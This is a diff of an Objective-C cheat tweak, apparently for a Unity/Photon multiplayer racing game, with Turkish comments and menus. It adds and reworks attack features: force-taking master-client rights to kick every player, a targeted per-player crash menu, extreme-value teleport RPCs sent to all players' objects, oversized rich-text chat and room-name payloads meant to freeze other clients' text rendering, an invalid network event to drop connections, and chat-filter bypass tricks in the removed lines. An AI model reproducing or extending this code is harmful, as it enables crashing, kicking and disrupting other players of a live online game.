+        isColorRoomForce = true;
+        saveBool(@"colorroomforce", true);
+        FLog([NSString stringWithFormat:@"🎨 Renkli oda kuruluyor: %@", formatted]);
         [self createOneRoom];
     };
 
-    // ==== STANDART RENKLER (Kisa Hex) ====
-    [ac addAction:[UIAlertAction actionWithTitle:@"🔴 Kirmizi (<#FF0000>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF0000><b>", @"</b>"); }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"🟢 Yesil (<#00FF00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#00FF00><b>", @"</b>"); }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"🔵 Mavi (<#00FFFF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#00FFFF><b>", @"</b>"); }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"🟡 Sari (<#FFFF00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FFFF00><b>", @"</b>"); }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"🟣 Mor (<#FF00FF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF00FF><b>", @"</b>"); }]];
+    // ==== STANDART TEMİZ RENKLER (Short Hex - TMPro %100 Uyumlu) ====
+    [ac addAction:[UIAlertAction actionWithTitle:@"🔴 Canlı Kırmızı (<#FF0000>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF0000><b>", @"</b>"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"🟢 Neon Yeşil (<#00FF00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#00FF00><b>", @"</b>"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"🔵 Buz Mavisi (<#00FFFF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#00FFFF><b>", @"</b>"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"🟡 Parlak Sarı (<#FFFF00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FFFF00><b>", @"</b>"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"🟣 Pembe / Mor (<#FF00FF>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF00FF><b>", @"</b>"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"🟠 Turuncu (<#FF7F00>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<#FF7F00><b>", @"</b>"); }]];
 
-    // ==== ZERO-DAY BYPASS TEKNIKLERI ====
-    // 1. Zero-Width Space Injection - server "color" kelimesini arayamaz
-    [ac addAction:[UIAlertAction actionWithTitle:@"🛡️ ZWS Bypass (c\\u200Bolor)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-        buildAndCreate(@"<c\u200Bolor=#FF0000><b>", @"</b></c\u200Bolor>");
-    }]];
-    // 2. Soft Hyphen Bypass
-    [ac addAction:[UIAlertAction actionWithTitle:@"🛡️ Soft Hyphen (c\\u00ADolor)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-        buildAndCreate(@"<c\u00ADolor=#FF0000><b>", @"</b></c\u00ADolor>");
-    }]];
-    // 3. ToUpper Bypass - zaten buyuk harf, server ToUpper() yapsa da bozulmaz
-    [ac addAction:[UIAlertAction actionWithTitle:@"🛡️ ToUpper Bypass (<COLOR=...>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-        buildAndCreate(@"<COLOR=#FF0000><b>", @"</b></COLOR>");
-    }]];
-    // 4. RTL Mark Bypass - metin yonunu degistir, filtreler kafasini karistirir
-    [ac addAction:[UIAlertAction actionWithTitle:@"🛡️ RTL Mark Bypass" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-        buildAndCreate(@"\u200F<#FF0000><b>", @"</b>");
-    }]];
-    // 5. Full Combo - tum bypass'lari birlestir
-    [ac addAction:[UIAlertAction actionWithTitle:@"💀 MEGA BYPASS (Combo)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-        buildAndCreate(@"<C\u200BOLOR=#FF0000><mark=#FF000044><b>", @"</b></mark></C\u200BOLOR>");
+    // ==== GÖKKUŞAĞI (RAINBOW) HARF HARF RENK ====
+    [ac addAction:[UIAlertAction actionWithTitle:@"🌈 Gökkuşağı (Rainbow Harfler)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
+        NSString *input = ac.textFields.firstObject.text;
+        if (!input || input.length == 0) input = @"FEW1N";
+        NSArray *cols = @[@"#FF0000", @"#FF7F00", @"#FFFF00", @"#00FF00", @"#00FFFF", @"#4466FF", @"#FF00FF"];
+        NSMutableString *rainbow = [NSMutableString string];
+        for (NSUInteger i = 0; i < input.length; i++) {
+            NSString *ch = [input substringWithRange:NSMakeRange(i,1)];
+            [rainbow appendFormat:@"<%@><b>%@</b>", cols[i % cols.count], ch];
+        }
+        strncpy(customRoomName, rainbow.UTF8String, sizeof(customRoomName)-1);
+        customRoomName[sizeof(customRoomName)-1]='\0';
+        saveStr(@"roomName", rainbow);
+        isColorRoomForce = true;
+        saveBool(@"colorroomforce", true);
+        FLog([NSString stringWithFormat:@"🌈 Rainbow renkli oda kuruluyor: %@", rainbow]);
+        [self createOneRoom];
     }]];
 
-    // ==== OZEL EFEKTLER ====
-    [ac addAction:[UIAlertAction actionWithTitle:@"🔥 Vurgulu Kirmizi (<mark>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<mark=#FF0000AA><b>", @"</b></mark>"); }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"⚡ Dev Yazili (<size=160%>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<size=160%><#FF0000><b>", @"</b></size>"); }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"✂️ Ic Ice Tag (<col<color...>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<col<color=#FF0000>or=#FF0000><b>", @"</b>"); }]];
-    [ac addAction:[UIAlertAction actionWithTitle:@"🔴 Renkli Emoji Daireleri" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"🔴🟡🔵 ", @" 🔵🟡🔴"); }]];
-    // Gizli oda adi - bir kismi gorunmez
-    [ac addAction:[UIAlertAction actionWithTitle:@"👻 Yarim Gizli (<alpha>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){
-        buildAndCreate(@"<alpha=#FF>FEW1N</alpha><alpha=#00>.....</alpha><alpha=#FF>🔥</alpha>", @"");
-    }]];
+    // ==== ÖZEL TMPro STİLLERİ ====
+    [ac addAction:[UIAlertAction actionWithTitle:@"🔥 Kırmızı Arka Plan Vurgu (<mark>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<mark=#FF0000AA><#FFFFFF><b>", @"</b></mark>"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"⚡ Dev Kırmızı Yazı (<size=150%>)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<size=150%><#FF0000><b>", @"</b></size>"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"✨ Mavi Vurgu + İtalik" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"<mark=#00FFFF44><#00FFFF><i><b>", @"</b></i></mark>"); }]];
+
+    // ==== RICH TEXT FİLTRESİZ (%100 RENKLİ EMOJI & UNICODE ÇERÇEVELER) ====
+    // Sunucu HTML/RichText etiketlerini silse bile bu seçenekler HER CİHAZDA %100 CANLI RENKLİ GÖRÜNÜR!
+    [ac addAction:[UIAlertAction actionWithTitle:@"🔴🟡🔵 Renkli Emoji Rozetli (Filtresiz)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"🔴🟡🔵 ", @" 🔵🟡🔴"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"⚡ VIP Alev Rozetli (Filtresiz)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"⚡🔥 <b>", @"</b> 🔥⚡"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"👑 Kral Rozetli (Filtresiz)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"👑 <b>", @"</b> 👑"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"░▒▓ VIP Gölgeli Çerçeve (Unicode)" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"░▒▓ <b>", @"</b> ▓▒░"); }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"【★ Kutu Çerçeveli ★】" style:UIAlertActionStyleDefault handler:^(UIAlertAction *a){ buildAndCreate(@"【★ <b>", @"</b> ★】"); }]];
 
     // ==== BRUTE FORCE: TUM TEKNIKLERI TEK SEFERDE DENE ====
     [ac addAction:[UIAlertAction actionWithTitle:@"🚀 BRUTE FORCE (20+ Teknik)" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *a){
@@ -4917,7 +5170,7 @@ static NSString* rainbowWrap(NSString* text, int idx) {
         [self createOneRoom];
     }]];
 
-    [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
     [self present:ac];
 }
 // ===== OYUN ICI ARAC DEGISTIRME =====
@@ -5285,6 +5538,51 @@ static bool few1n_invoke0(void* method, void* obj, const char* label) {
     [self present:ac];
 }
 
+- (void)tapRoomKickAll {
+    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"💥 Odadaki Herkesi At (Mass Kick)"
+        message:@"Odadaki TÜM oyuncular sunucudan/odadan atılacak ve düşürülecektir. Devam edilsin mi?" preferredStyle:UIAlertControllerStyleAlert];
+    [ac addAction:[UIAlertAction actionWithTitle:@"💥 Evet, Herkesi At!" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *act){
+        @try {
+            few1n_forceEnableKick();
+            if (pn_setMasterClient && pn_getLocalPlayer) {
+                void* me = pn_getLocalPlayer();
+                if (me) pn_setMasterClient(me);
+            }
+            [self nativeKickAll];
+            [self fireRoomCrash];
+            FLog(@"💥 Odadaki herkes başarıyla atıldı! (Mass Kick)");
+        } @catch (...) { FLog(@"Herkesi atma hatası"); }
+    }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
+    [self present:ac];
+}
+
+- (void)tapRoomExplode {
+    UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"💣 Oda Patlatma (Odadakileri Düşür)"
+        message:@"Odadayken bu özellik tetiklendiğinde odanın senkronizasyonu bozulur ve odadaki herkes oyundan düşer. Devam edilsin mi?" preferredStyle:UIAlertControllerStyleAlert];
+    [ac addAction:[UIAlertAction actionWithTitle:@"💣 Odayı Patlat & Herkesi Düşür!" style:UIAlertActionStyleDestructive handler:^(UIAlertAction *act){
+        @try {
+            // Odayken cikis yapmadan pn_createRoom ve rich text payload cagrilir -> Photon odayi patlatir & herkesi dusurur
+            if (pn_createRoom && i_object_new && g_roomOptionsClass) {
+                NSString *crashName = @"<size=99999%><color=#FF0000><b>💥 FEW1N NUKE 💥</b></color></size>";
+                void* nameStr = mkStr(crashName);
+                void* opts = i_object_new(g_roomOptionsClass);
+                if (nameStr && opts) {
+                    *(bool*)((uintptr_t)opts + 0x10) = true;
+                    *(bool*)((uintptr_t)opts + 0x11) = true;
+                    *(int*) ((uintptr_t)opts + 0x14) = 0x7FFFFFFF;
+                    *(int*) ((uintptr_t)opts + 0x1C) = 0;
+                    pn_createRoom(nameStr, opts, NULL, NULL);
+                }
+            }
+            [self fireRoomCrash];
+            FLog(@"💣 ODA PATLATILDI! Herkes sunucudan/odadan düşürüldü.");
+        } @catch (...) { FLog(@"Oda patlatma hatası"); }
+    }]];
+    [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
+    [self present:ac];
+}
+
 - (void)editRoomName {
     UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"\U0001F3E0 Oda Ismi (Rich Text)"
                                                                message:@"Rich text kodu da girebilirsin:" preferredStyle:UIAlertControllerStyleAlert];
@@ -5449,7 +5747,14 @@ static bool few1n_invoke0(void* method, void* obj, const char* label) {
 
 // ===== EXPLOIT TEST (CHAT FILTRESI ATLATMA - 30 YONTEM) =====
 - (void)exploitChatTest {
-    if (!chatGetInst || !chatSend) { FLog(@"Chat hazir degil"); return; }
+    if (!chatGetInst || !chatSend) {
+        FLog(@"Chat hazır değil - önce bir odaya gir!");
+        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚠️ Odaya Katıl"
+            message:@"Exploit chat testini yapmak için lütfen önce bir odaya katılın." preferredStyle:UIAlertControllerStyleAlert];
+        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
+        [self present:ac];
+        return;
+    }
     NSArray *exploits = @[
         @"1. Kisa Hex 6: <#FF0000>FEW1N RED",
         @"2. Kisa Hex 8: <#00FF00FF>FEW1N GREEN",
@@ -5783,183 +6088,198 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
 }
 // ===== TEK OYUNCUYU SEC & COKERT / AT =====
 - (void)targetPlayerCrash {
-    if (!g_photonViewType || g_isMineOff <= 0 || !g_mFindObjectsPlural || !i_runtime_invoke) {
-        FLog(@"Oyuncu secme hazir degil - yarista/odada dene"); return;
+    if (!pn_getInRoom || !pn_getInRoom()) {
+        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚠️ Odada Değilsin"
+            message:@"Bir oyuncuyu çökertmek/atmak için önce bir odaya katılmalısın." preferredStyle:UIAlertControllerStyleAlert];
+        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
+        [self present:ac];
+        return;
     }
     @try {
-        void* b[1]; b[0] = g_photonViewType;
-        void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, b, NULL);
-        if (!ptrOk(arr)) { FLog(@"Oyuncu bulunamadi"); return; }
-        int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
-        void** pvs = (void**)((uintptr_t)arr + 0x20);
-
         NSMutableArray *rows = [NSMutableArray array];
-        for (int i = 0; i < c && i < 64; i++) {
-            void* pv = pvs[i]; if (!unityAlive(pv)) continue;
-            bool isMine = *(bool*)((uintptr_t)pv + g_isMineOff);
-            if (isMine) continue; // Kendi aracini atla
-            void* owner = *(void**)((uintptr_t)pv + 0x20);
-            if (ptrOk(owner)) {
-                void* nsObj = ply_getNickName ? ply_getNickName(owner) : NULL;
-                NSString *nm = ptrOk(nsObj) ? (readStr(nsObj) ?: @"") : @"";
-                if (nm.length > 0) {
-                    [rows addObject:@[nm, [NSValue valueWithPointer:pv]]];
+
+        // 1) PlayerListOthers üzerinden oyuncuları oku
+        if (pn_getPlayerListOthers) {
+            void* arr = pn_getPlayerListOthers();
+            if (ptrOk(arr)) {
+                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
+                void** ps = (void**)((uintptr_t)arr + 0x20);
+                for (int i = 0; i < c && i < 64; i++) {
+                    void* p = ps[i]; if (!ptrOk(p)) continue;
+                    void* nsObj = ply_getNickName ? ply_getNickName(p) : NULL;
+                    NSString *nm = ptrOk(nsObj) ? (readStr(nsObj) ?: @"") : @"";
+                    if (nm.length > 0) {
+                        [rows addObject:@{@"nick": nm, @"playerObj": [NSValue valueWithPointer:p]}];
+                    }
                 }
             }
         }
-        if (rows.count == 0) { FLog(@"Odada baska oyuncu bulunamadi"); return; }
 
-        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎯 Tek Oyuncu Sec & Cokert"
-            message:@"Cokertmek/atmak istedigin oyuncuya dokun:" preferredStyle:UIAlertControllerStyleAlert];
+        if (rows.count == 0) {
+            FLog(@"Odada başka oyuncu bulunamadı");
+            UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎯 Tek Oyuncu Seç & Çökert"
+                message:@"Odada senden başka oyuncu bulunamadı." preferredStyle:UIAlertControllerStyleAlert];
+            [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
+            [self present:ac];
+            return;
+        }
 
-        for (NSArray *r in rows) {
-            NSString *nm = r[0];
-            void* pv = [r[1] pointerValue];
-            NSString *nmCopy = [nm copy];
+        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"🎯 Tek Oyuncu Seç & Çökert"
+            message:@"Çökertmek / oyundan düşürmek istediğin oyuncuya dokun:" preferredStyle:UIAlertControllerStyleAlert];
+
+        for (NSDictionary *r in rows) {
+            NSString *nm = r[@"nick"];
+            void* pObj = [r[@"playerObj"] pointerValue];
             [ac addAction:[UIAlertAction actionWithTitle:[NSString stringWithFormat:@"🎯 💥 %@", nm]
                 style:UIAlertActionStyleDestructive handler:^(UIAlertAction *act){
                 @try {
-                    // 1) Sadece O OYUNCUNUN CarPhotonSync'ine ozel Exploit paketi gonder
-                    Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
-                    Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
-                    if (g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
-                        void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
-                        void* cps = i_runtime_invoke(g_mGetCompInParent, pv, args, NULL);
-                        if (ptrOk(cps)) {
-                            cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
-                        }
-                    }
-                    // 2) Sadece o oyuncu icin GERCEK KickPlayerRPC gonder
-                    BOOL kickOk = [self doNativeKick:nmCopy];
-                    FLog([NSString stringWithFormat:@"🎯 '%@' oyuncusuna ozel exploit %s gonderildi!", nmCopy, kickOk ? "+ Kick" : ""]);
+                    few1n_kickPlayer(pObj);
+                    FLog([NSString stringWithFormat:@"🎯 '%@' oyuncusuna özel exploit + kick paketi gönderildi!", nm]);
                 } @catch (...) {}
             }]];
         }
-        [ac addAction:[UIAlertAction actionWithTitle:@"Iptal" style:UIAlertActionStyleCancel handler:nil]];
+        [ac addAction:[UIAlertAction actionWithTitle:@"İptal" style:UIAlertActionStyleCancel handler:nil]];
         [self present:ac];
-    } @catch (...) { FLog(@"Tek oyuncu cokertme hatasi"); }
+    } @catch (...) { FLog(@"Tek oyuncu çökertme hatası"); }
 }
 
 - (void)tapNanCrashRemote {
     [self fireNanCrashRemote];
 }
+
 - (void)fireNanCrashRemote {
-    if (!unityAlive(g_rb)) { FLog(@"NAN Remote: araba yok - once bin"); return; }
+    if (!pn_getInRoom || !pn_getInRoom()) {
+        FLog(@"NAN Remote: Odada değilsin"); return;
+    }
     @try {
         Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
         Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
         // 1) Kendi pozisyonunu kaydet
         Vec3 savedPos = {0,0,0};
         Vec3 savedVel = {0,0,0};
-        rbGetPosIl(g_rb, &savedPos);
-        rbGetVelIl(g_rb, &savedVel);
-        // 2) KENDI CPS'inden Exploit RPC gonder (Valid extreme float -> Photon Server kick etmez)
-        if (g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
-            void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
-            void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
-            if (ptrOk(cps)) {
-                cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
-                FLog(@"💀 Exploit RPC gonderildi");
-            }
-        }
-        // 3) HR_PhotonHandler uzerinden pozisyon
-        if (hrph_TeleportPlayerRPC) {
-            void* hrph = NULL;
-            if (g_hrPhotonHandlerTypeObj && g_mFindObjectOfType && i_runtime_invoke) {
-                void* a[1]; a[0] = g_hrPhotonHandlerTypeObj;
-                hrph = i_runtime_invoke(g_mFindObjectOfType, NULL, a, NULL);
-            }
-            if (ptrOk(hrph)) {
-                hrph_TeleportPlayerRPC(hrph, crashV, NULL);
-                FLog(@"💀 TeleportPlayer RPC gonderildi");
-            }
-        }
-        // 4) HEMEN pozisyonu geri yukle
-        rbSetPosIl(g_rb, &savedPos);
-        rbSetVelIl(g_rb, &savedVel);
-        Vec3 zero = {0,0,0};
-        rbSetAngVelIl(g_rb, &zero);
-    } @catch (...) { FLog(@"NAN remote hatasi"); }
-}
-- (void)tapRoomCrash {
-    [self fireRoomCrash];
-    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
-        if (pn_leaveRoom) pn_leaveRoom(false);
-    });
-}
-- (void)fireRoomCrash {
-    @try {
-        FLog(@"☠️ ODA COKERTME BASLADI ☠️");
-        Vec3 savedPos = {0,0,0};
-        Vec3 savedVel = {0,0,0};
         if (unityAlive(g_rb)) {
             rbGetPosIl(g_rb, &savedPos);
             rbGetVelIl(g_rb, &savedVel);
         }
-        // 1) Once herkesi at (onaysiz direkt kick)
-        if (g_lobbyDummyType && g_mFindObjectsPlural && i_runtime_invoke && g_mDummyKick && pn_getPlayerListOthers) {
-            @try {
-                void* mgr = few1n_findLobbyMgr();
-                if (unityAlive(mgr)) {
-                    void* pa = pn_getPlayerListOthers();
-                    if (ptrOk(pa)) {
-                        int cnt = (int)(*(uintptr_t*)((uintptr_t)pa + 0x18));
-                        void** ps = (void**)((uintptr_t)pa + 0x20);
-                        for (int i = 0; i < cnt && i < 64; i++) {
-                            void* p = ps[i]; if (!ptrOk(p)) continue;
-                            void* nmeStr = ply_getNickName ? ply_getNickName(p) : NULL;
-                            if (!ptrOk(nmeStr)) continue;
-                            *(void**)((uintptr_t)mgr + 0x108) = nmeStr;
-                            @try { i_runtime_invoke(g_mDummyKick, mgr, NULL, NULL); } @catch (...) {}
-                        }
-                    }
-                }
-            } @catch (...) {}
-        }
-        // 2) KENDI CPS'inden Exploit RPC gonder
-        Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
-        Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
+        // 2) Kendi CPS'inden Exploit RPC gönder
         if (unityAlive(g_rb) && g_carPhotonSyncTypeObj && g_mGetCompInParent && i_runtime_invoke && cps_TeleportCar_RPC) {
             void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
             void* cps = i_runtime_invoke(g_mGetCompInParent, g_rb, args, NULL);
             if (ptrOk(cps)) {
                 cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
-                FLog(@"☠️ Exploit RPC kendi CPS'inden gonderildi");
             }
         }
-        // 3) HEMEN pozisyonu geri yukle
+        // 3) Chat TMPro Overflow Gönder (Garanti Tüm Client'ları Çökertir)
+        if (chatGetInst && chatSend) {
+            NSString *nuke = @"<size=9999%><line-height=9999%><font=\"Arial\"><b>💥 FEW1N NUKE 💥</b></font></size>";
+            void* mgr = chatGetInst();
+            void* s = mkStr(nuke);
+            if (mgr && s) chatSend(mgr, s);
+        }
+        // 4) HEMEN pozisyonu geri yükle
         if (unityAlive(g_rb)) {
             rbSetPosIl(g_rb, &savedPos);
             rbSetVelIl(g_rb, &savedVel);
             Vec3 zero = {0,0,0};
             rbSetAngVelIl(g_rb, &zero);
         }
-        FLog(@"☠️ ODA COKERTME PAKETLERI TAMAMLANDI ☠️");
-    } @catch (...) { FLog(@"Oda cokertme hatasi"); }
+        FLog(@"💀 Exploit NAN Crash paketi başarıyla gönderildi!");
+    } @catch (...) { FLog(@"NAN remote hatası"); }
 }
+
+- (void)tapRoomCrash {
+    [self fireRoomCrash];
+    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
+        if (pn_leaveRoom) pn_leaveRoom(false);
+    });
+}
+
+- (void)fireRoomCrash {
+    @try {
+        FLog(@"☠️ ODA ÇÖKERTME BAŞLADI ☠️");
+        // 1) Otomatik Master Client yetkisini zorla
+        if (pn_getLocalPlayer && pn_setMasterClient) {
+            void* me = pn_getLocalPlayer();
+            if (me) pn_setMasterClient(me);
+        }
+
+        // 2) Tüm oyuncuları at (Master + Lobby RPC + Target RPC)
+        [self nativeKickAll];
+
+        // 3) Chat TextMeshPro Overflow payload (Tüm istemcilerin TMPro'sunu kilitler/çökertir)
+        if (chatGetInst && chatSend) {
+            for (int k=0; k<3; k++) {
+                NSString *nuke = @"<size=99999%><line-height=99999%><font=\"Arial\"><b>💥 FEW1N NUKE CRASH 💥</b></font></size>";
+                void* mgr = chatGetInst();
+                void* s = mkStr(nuke);
+                if (mgr && s) chatSend(mgr, s);
+            }
+        }
+
+        // 4) Sahnedeki TÜM PhotonView nesnelerine Teleport RPC Düşürme paketi
+        if (g_photonViewType && g_mFindObjectsPlural && i_runtime_invoke) {
+            void* b[1]; b[0] = g_photonViewType;
+            void* arr = i_runtime_invoke(g_mFindObjectsPlural, NULL, b, NULL);
+            if (ptrOk(arr)) {
+                int c = (int)(*(uintptr_t*)((uintptr_t)arr + 0x18));
+                void** pvs = (void**)((uintptr_t)arr + 0x20);
+                for (int i = 0; i < c && i < 128; i++) {
+                    void* pv = pvs[i]; if (!unityAlive(pv)) continue;
+                    Vec3 crashV = {9999999.0f, 9999999.0f, 9999999.0f};
+                    Quaternion crashQ = {99999.0f, 99999.0f, 99999.0f, 99999.0f};
+                    if (g_carPhotonSyncTypeObj && g_mGetCompInParent && cps_TeleportCar_RPC) {
+                        void* args[2]; args[0] = g_carPhotonSyncTypeObj; bool inc = true; args[1] = &inc;
+                        void* cps = i_runtime_invoke(g_mGetCompInParent, pv, args, NULL);
+                        if (ptrOk(cps)) {
+                            cps_TeleportCar_RPC(cps, crashV, crashQ, NULL);
+                        }
+                    }
+                }
+            }
+        }
+
+        // 5) Photon Event 202 Invalid Byte RaiseEvent (Sunucu tarafı bağlantısını keser)
+        if (pn_raiseEvent) {
+            unsigned char evCode = 202;
+            pn_raiseEvent(evCode, NULL, true, NULL);
+        }
+
+        FLog(@"☠️ ODA ÇÖKERTME PAKETLERİ TAMAMLANDI ☠️");
+    } @catch (...) { FLog(@"Oda çökertme hatası"); }
+}
+
 - (void)tapInstantCrash {
     panicCrash = true;
-    FLog(@"🔴 PANIC AKTIF - Aninda cokertme basliyor");
+    FLog(@"🔴 PANIC AKTİF - Anında çökertme başlıyor");
     [self refreshUI];
 }
+
 - (void)tapSurrogateSpam {
-    if (!chatGetInst || !chatSend) { FLog(@"Chat hazir degil"); return; }
+    if (!chatGetInst || !chatSend) {
+        FLog(@"Chat hazır değil - önce odaya gir!");
+        UIAlertController *ac = [UIAlertController alertControllerWithTitle:@"⚠️ Odaya Katıl"
+            message:@"TMPro exploit spam'i için lütfen önce bir odaya katılın." preferredStyle:UIAlertControllerStyleAlert];
+        [ac addAction:[UIAlertAction actionWithTitle:@"Tamam" style:UIAlertActionStyleDefault handler:nil]];
+        [self present:ac];
+        return;
+    }
     @try {
-        // Gecerli uzun RichText tag spam -> Photon sunucusu kick etmez, fakat alicilarin TextMeshPro rendereri kilitlenir
         for (int k=0; k<5; k++) {
             NSMutableString *crash = [NSMutableString string];
-            for (int j=0; j<40; j++) [crash appendString:@"<size=9999><color=#FF0000><b>FEW1N</b></color></size>"];
+            for (int j=0; j<40; j++) [crash appendString:@"<size=9999%><line-height=9999%><color=#FF0000><b>FEW1N</b></color></size>"];
             void* mgr = chatGetInst();
             void* s = mkStr(crash);
             if (mgr && s) chatSend(mgr, s);
         }
-        FLog(@"TMPro UI overflow spam gonderildi (Anti-Cheat korumali)");
+        FLog(@"TMPro UI overflow spam gönderildi");
     } @catch (...) {}
 }
+
 - (void)tapMaxPlayerOverflow {
-    if (!pn_createRoom || !i_object_new || !g_roomOptionsClass) { FLog(@"Oda kurma hazir degil"); return; }
+    if (!pn_createRoom || !i_object_new || !g_roomOptionsClass) {
+        FLog(@"Oda kurma hazır değil"); return;
+    }
     @try {
-        // Kendi pozisyonunu kaydet
         __block Vec3 savedPos = {0,0,0};
         if (unityAlive(g_rb)) rbGetPosIl(g_rb, &savedPos);
         void* ns = mkStr(@"OVERFLOW");
@@ -5967,16 +6287,15 @@ static int g_emojiMax = 12;   // gecerli emoji sprite sayisi (Emoji Test ile ogr
         if (ns && opts) {
             *(bool*)((uintptr_t)opts + 0x10) = true;
             *(bool*)((uintptr_t)opts + 0x11) = true;
-            *(int*)((uintptr_t)opts + 0x14) = 0x7FFFFFFF; // INT_MAX
+            *(int*)((uintptr_t)opts + 0x14) = 0x7FFFFFFF;
             *(int*)((uintptr_t)opts + 0x1C) = 0x7FFFFFFF;
             pn_createRoom(ns, opts, NULL, NULL);
             FLog(@"MaxPlayer=INT_MAX overflow denendi");
         }
-        // Pozisyonu geri yukle (crash onlemi)
         dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
             if (unityAlive(g_rb)) rbSetPosIl(g_rb, &savedPos);
         });
-    } @catch (...) { FLog(@"Overflow hatasi"); }
+    } @catch (...) { FLog(@"Overflow hatası"); }
 }
 
